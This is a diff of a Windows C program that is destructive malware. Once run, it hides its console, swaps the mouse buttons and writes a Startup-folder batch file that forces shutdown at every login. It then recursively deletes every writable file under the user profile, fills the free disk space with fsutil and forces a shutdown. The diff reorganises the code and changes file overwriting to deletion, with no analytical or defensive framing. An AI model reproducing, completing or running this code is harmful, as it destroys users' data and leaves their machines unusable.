@@ -5,7 +5,6 @@
 #include <sys/stat.h>
 #include <string.h>
 #include <io.h>
-#define SUS "\x90"
 #define ULONG unsigned long long
 #define PU PULARGE_INTEGER
 #define SETCPOS \
@@ -13,28 +12,31 @@
     //0x7fffffff
 
 const int S=256;
-void overwrite(const char *filename);
 void flame(char *basepath);
-void amongus();
 ULONG freespace();
 int recognize_dir(char *file);
 _Bool checkperms(char *path);
- 
+
 int main(){
-    char *sus=getenv("USERPROFILE");
+    char napoli[S],*sussyuwu=getenv("APPDATA"),*sus=getenv("USERPROFILE");
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     SwapMouseButton(TRUE);  //rundll32.exe user32.dll,SwapMouseButton
+    if(sussyuwu!=NULL&&!chdir(sussyuwu)&&checkperms(sussyuwu)){
+        chdir(sussyuwu);
+        char fpath[S];
+        strcpy(fpath,sussyuwu);
+        strcat(fpath,"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\teardrops.bat");
+        FILE *catanzaro = fopen(fpath,"wb");
+        fprintf(catanzaro,"@echo off\nshutdown /s /f /t 0");
+        fclose(catanzaro);
+    }
     flame(sus);
-    amongus();
+    chdir(sussyuwu);
+    ULONG a=(!freespace()?S:freespace());
+    sprintf(napoli,"fsutil file createnew lol %llu",a);
+    system(napoli);
     MessageBox(NULL,"\nWe love you.\n\n:3\n\n",__FILE__,1);
     return ExitWindowsEx(EWX_SHUTDOWN|EWX_FORCE,0);
-}
- 
-void overwrite(const char *filename){
-    SETCPOS;
-    FILE *file=fopen(filename,"wb");
-    fwrite(SUS,1,sizeof(SUS),file);
-    fclose(file);
 }
  
 void flame(char *basepath){
@@ -52,41 +54,25 @@ void flame(char *basepath){
                 sprintf(dirpath,"%s\\%s",_getcwd(NULL,0),file);
                 if(checkperms(dirpath)) flame(dirpath); //i love recursionz
                 chdir("..");
-            } else overwrite(file);
-        }
+            } else remove(file);
+        }  
         closedir(ls);
     }
     SETCPOS;
 }
- 
-void amongus(){
-    char napoli[S],*sussyuwu=getenv("APPDATA");
-    if(sussyuwu!=NULL&&!chdir(sussyuwu)&&checkperms(sussyuwu)){
-        chdir(sussyuwu);
-        char fpath[S];
-        strcpy(fpath,sussyuwu);
-        strcat(fpath,"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\teardrops.bat");
-        FILE *catanzaro = fopen(fpath,"wb");
-        fprintf(catanzaro,"@echo off\nshutdown /s /f /t 0");
-        fclose(catanzaro);
-        ULONG a=(!freespace()?S:freespace());
-        sprintf(napoli,"fsutil file createnew lol %llu",a);
-        system(napoli);
-    }
-}
- 
+
 ULONG freespace(){
     ULONG ab=0;
     if(GetDiskFreeSpaceExA("C:\\",(PU)&ab,(PU)0,(PU)0)) return ab;
     else return 0;
 }
- 
+
 int recognize_dir(char *file){
     struct stat isdir;
     stat(file, &isdir);
     return S_ISREG(isdir.st_mode);
 }
- 
+
 _Bool checkperms(char *path){
     if (!_access(path, 2)) return 1; //FILE_ATTRIBUTE_DIRECTORY
     return 0;   
